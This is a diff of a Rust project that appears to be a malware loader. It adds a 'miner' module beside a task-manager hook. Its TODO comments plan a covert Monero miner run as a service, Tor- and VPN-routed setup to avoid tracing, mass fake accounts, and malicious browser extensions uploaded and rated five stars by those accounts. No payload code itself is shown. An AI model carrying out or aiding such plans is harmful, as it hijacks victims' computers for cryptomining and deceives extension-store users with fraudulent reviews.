@@ -17,6 +17,7 @@ use tasks::task_manager_hook::run_query_hooker;
 mod tasks;
 mod utils;
 mod network;
+mod miner;
 
 lazy_static! {
     pub static ref LOGGER: Mutex<Option<Logger>> = Mutex::new(None);
@@ -147,15 +148,6 @@ async fn main() {
 
 //? add function that updates the miner config ( and then ? - it)
 //? add miner configuration, installation and full run - offline possible - name of miner is constant that should be included in constants
-//? in new vm under tor install monero wallet make sub address and export to config, save logins on a piece of paper with pen
 
-//? upload to gitlab on new vm routed through tor and extra vpn, and save link in master constants.rs
-//? test runtime
-
+// add mutexes IN client - loader mainly run as service  - client - mutex by version
 // add error in terminal collecting
-
-// code extension builder - whats left:
-//? upload map.js
-//? in new vm via tor create many accounts
-//? add threads and generate extensions
-//? then simply upload and rank each 5 star
